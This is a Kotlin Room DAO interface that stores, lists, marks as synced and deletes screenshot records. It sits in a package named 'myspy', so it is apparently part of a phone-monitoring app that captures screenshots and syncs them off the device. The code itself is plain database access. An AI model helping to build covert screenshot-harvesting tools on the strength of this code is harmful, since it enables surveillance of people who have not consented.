package com.myspy.android.data.local.db.dao

import androidx.room.*
import com.myspy.android.data.local.db.entities.ScreenshotEntity

@Dao
interface ScreenshotDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insert(screenshot: ScreenshotEntity): Long

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    suspend fun insertAll(screenshots: List<ScreenshotEntity>)

    @Query("SELECT * FROM screenshots WHERE synced = 0")
    suspend fun getUnsyncedScreenshots(): List<ScreenshotEntity>

    @Query("SELECT COUNT(*) FROM screenshots WHERE synced = 0")
    suspend fun getUnsyncedCount(): Int

    @Query("UPDATE screenshots SET synced = 1 WHERE id IN (:ids)")
    suspend fun markAsSynced(ids: List<Long>)

    @Query("SELECT * FROM screenshots ORDER BY timestamp DESC LIMIT :limit")
    suspend fun getRecentScreenshots(limit: Int = 50): List<ScreenshotEntity>

    @Query("DELETE FROM screenshots WHERE timestamp < :beforeTimestamp")
    suspend fun deleteOlderThan(beforeTimestamp: Long)

    @Delete
    suspend fun delete(screenshot: ScreenshotEntity)
}
